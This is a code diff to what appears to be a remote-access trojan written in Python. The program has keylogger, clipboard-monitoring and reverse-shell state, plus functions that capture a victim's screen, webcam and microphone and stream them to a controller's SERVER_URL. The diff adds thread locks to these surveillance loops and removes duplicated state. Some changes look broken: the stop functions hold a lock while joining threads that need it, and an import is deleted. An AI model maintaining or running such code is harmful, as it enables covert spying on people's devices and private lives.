@@ -198,6 +198,11 @@ AUDIO_STREAM_THREAD = None
 CAMERA_STREAMING_ENABLED = False
 CAMERA_STREAM_THREAD = None
 
+# --- Thread Safety ---
+STREAMING_LOCK = threading.Lock()
+AUDIO_LOCK = threading.Lock()
+CAMERA_LOCK = threading.Lock()
+
 # --- Monitoring State ---
 KEYLOGGER_ENABLED = False
 KEYLOGGER_THREAD = None
@@ -2311,14 +2316,6 @@ def sleep_random_non_blocking():
         # Fallback to regular sleep if eventlet not available
         sleep_random()
 
-# --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
-
 # --- Reverse Shell State ---
 REVERSE_SHELL_ENABLED = False
 REVERSE_SHELL_THREAD = None
@@ -2328,27 +2325,6 @@ REVERSE_SHELL_SOCKET = None
 VOICE_CONTROL_ENABLED = False
 VOICE_CONTROL_THREAD = None
 VOICE_RECOGNIZER = None
-
-# --- Monitoring State ---
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
-CLIPBOARD_MONITOR_ENABLED = False
-CLIPBOARD_MONITOR_THREAD = None
-CLIPBOARD_BUFFER = []
-LAST_CLIPBOARD_CONTENT = ""
-
-# --- Audio Config ---
-if PYAUDIO_AVAILABLE:
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
-else:
-    CHUNK = 1024
-    FORMAT = None
-    CHANNELS = 1
-    RATE = 44100
 
 def get_or_create_agent_id():
     """
@@ -2414,7 +2390,10 @@ def _stream_screen_fallback(agent_id):
         return
     url = f"{SERVER_URL}/stream/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
-    while STREAMING_ENABLED:
+    while True:
+        with STREAMING_LOCK:
+            if not STREAMING_ENABLED:
+                break
         try:
             with mss.mss() as sct:
                 monitors = sct.monitors
@@ -2424,7 +2403,10 @@ def _stream_screen_fallback(agent_id):
                 frame_time = 1.0 / target_fps
                 last_frame_hash = None
                 frame_skip_count = 0
-                while STREAMING_ENABLED:
+                while True:
+                    with STREAMING_LOCK:
+                        if not STREAMING_ENABLED:
+                            break
                     current_time = time.time()
                     sct_img = sct.grab(monitors[monitor_index])
                     img = np.array(sct_img)
@@ -2480,7 +2462,10 @@ def stream_camera(agent_id):
         return
     url = f"{SERVER_URL}/camera/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
-    while CAMERA_STREAMING_ENABLED:
+    while True:
+        with CAMERA_LOCK:
+            if not CAMERA_STREAMING_ENABLED:
+                break
         try:
             cap = None
             backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY] if WINDOWS_AVAILABLE else [cv2.CAP_V4L2, cv2.CAP_ANY]
@@ -2510,7 +2495,10 @@ def stream_camera(agent_id):
             print(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
             frame_count = 0
             start_time = time.time()
-            while CAMERA_STREAMING_ENABLED:
+            while True:
+                with CAMERA_LOCK:
+                    if not CAMERA_STREAMING_ENABLED:
+                        break
                 try:
                     ret, frame = cap.read()
                     if not ret:
@@ -2560,7 +2548,10 @@ def stream_audio(agent_id):
         print("Error: PyAudio not available for audio capture")
         return
     url = f"{SERVER_URL}/audio/{agent_id}"
-    while AUDIO_STREAMING_ENABLED:
+    while True:
+        with AUDIO_LOCK:
+            if not AUDIO_STREAMING_ENABLED:
+                break
         try:
             p = pyaudio.PyAudio()
             input_devices = []
@@ -2606,7 +2597,10 @@ def stream_audio(agent_id):
                 continue
             frame_count = 0
             start_time = time.time()
-            while AUDIO_STREAMING_ENABLED:
+            while True:
+                with AUDIO_LOCK:
+                    if not AUDIO_STREAMING_ENABLED:
+                        break
                 try:
                     data = stream.read(CHUNK, exception_on_overflow=False)
                     frame_count += 1
@@ -2638,70 +2632,77 @@ def stream_audio(agent_id):
 
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
-    if not STREAMING_ENABLED:
-        STREAMING_ENABLED = True
-        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
-        STREAM_THREAD.daemon = True
-        STREAM_THREAD.start()
-        print("Started video stream.")
+    with STREAMING_LOCK:
+        if not STREAMING_ENABLED:
+            STREAMING_ENABLED = True
+            STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
+            STREAM_THREAD.daemon = True
+            STREAM_THREAD.start()
+            print("Started video stream.")
 
 def start_ultra_low_latency_streaming(agent_id):
     """Start ultra-low latency screen streaming (<16ms target)."""
     global STREAMING_ENABLED, STREAM_THREAD
-    if not STREAMING_ENABLED:
-        STREAMING_ENABLED = True
-        STREAM_THREAD = threading.Thread(target=stream_screen_ultra_low_latency, args=(agent_id,))
-        STREAM_THREAD.daemon = True
-        STREAM_THREAD.start()
-        print("Started ultra-low latency screen streaming (<16ms target).")
+    with STREAMING_LOCK:
+        if not STREAMING_ENABLED:
+            STREAMING_ENABLED = True
+            STREAM_THREAD = threading.Thread(target=stream_screen_ultra_low_latency, args=(agent_id,))
+            STREAM_THREAD.daemon = True
+            STREAM_THREAD.start()
+            print("Started ultra-low latency screen streaming (<16ms target).")
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
-    if STREAMING_ENABLED:
-        STREAMING_ENABLED = False
-        if STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            STREAM_THREAD.join(timeout=2)
-        STREAM_THREAD = None
-        print("Stopped video stream.")
+    with STREAMING_LOCK:
+        if STREAMING_ENABLED:
+            STREAMING_ENABLED = False
+            if STREAM_THREAD:
+                # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
+                STREAM_THREAD.join(timeout=2)
+            STREAM_THREAD = None
+            print("Stopped video stream.")
 
 def start_audio_streaming(agent_id):
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
-    if not AUDIO_STREAMING_ENABLED:
-        AUDIO_STREAMING_ENABLED = True
-        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
-        AUDIO_STREAM_THREAD.daemon = True
-        AUDIO_STREAM_THREAD.start()
-        print("Started audio stream.")
+    with AUDIO_LOCK:
+        if not AUDIO_STREAMING_ENABLED:
+            AUDIO_STREAMING_ENABLED = True
+            AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
+            AUDIO_STREAM_THREAD.daemon = True
+            AUDIO_STREAM_THREAD.start()
+            print("Started audio stream.")
 
 def stop_audio_streaming():
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
-    if AUDIO_STREAMING_ENABLED:
-        AUDIO_STREAMING_ENABLED = False
-        if AUDIO_STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            AUDIO_STREAM_THREAD.join(timeout=2)
-        AUDIO_STREAM_THREAD = None
-        print("Stopped audio stream.")
+    with AUDIO_LOCK:
+        if AUDIO_STREAMING_ENABLED:
+            AUDIO_STREAMING_ENABLED = False
+            if AUDIO_STREAM_THREAD:
+                # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
+                AUDIO_STREAM_THREAD.join(timeout=2)
+            AUDIO_STREAM_THREAD = None
+            print("Stopped audio stream.")
 
 def start_camera_streaming(agent_id):
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
-    if not CAMERA_STREAMING_ENABLED:
-        CAMERA_STREAMING_ENABLED = True
-        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
-        CAMERA_STREAM_THREAD.daemon = True
-        CAMERA_STREAM_THREAD.start()
-        print("Started camera stream.")
+    with CAMERA_LOCK:
+        if not CAMERA_STREAMING_ENABLED:
+            CAMERA_STREAMING_ENABLED = True
+            CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
+            CAMERA_STREAM_THREAD.daemon = True
+            CAMERA_STREAM_THREAD.start()
+            print("Started camera stream.")
 
 def stop_camera_streaming():
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
-    if CAMERA_STREAMING_ENABLED:
-        CAMERA_STREAMING_ENABLED = False
-        if CAMERA_STREAM_THREAD:
-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            CAMERA_STREAM_THREAD.join(timeout=2)
-        CAMERA_STREAM_THREAD = None
-        print("Stopped camera stream.")
+    with CAMERA_LOCK:
+        if CAMERA_STREAMING_ENABLED:
+            CAMERA_STREAMING_ENABLED = False
+            if CAMERA_STREAM_THREAD:
+                # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
+                CAMERA_STREAM_THREAD.join(timeout=2)
+            CAMERA_STREAM_THREAD = None
+            print("Stopped camera stream.")
 
 # --- Reverse Shell Functions ---
 
@@ -3425,7 +3426,6 @@ class UltraLowLatencyCapture:
     
     def _capture_dxcam(self):
         """DXGI Desktop Duplication - fastest method."""
-        import dxcam
         camera = dxcam.create(output_idx=0, output_color="BGR")
         return camera.grab()
     
@@ -3531,7 +3531,10 @@ def stream_screen_ultra_low_latency(agent_id):
     
     print(f"Starting ultra-low latency streaming (target: <{STREAMING_CONFIG['max_latency_ms']}ms)")
     
-    while STREAMING_ENABLED:
+    while True:
+        with STREAMING_LOCK:
+            if not STREAMING_ENABLED:
+                break
         frame_start = time.time()
         
         # Check if we should skip this frame
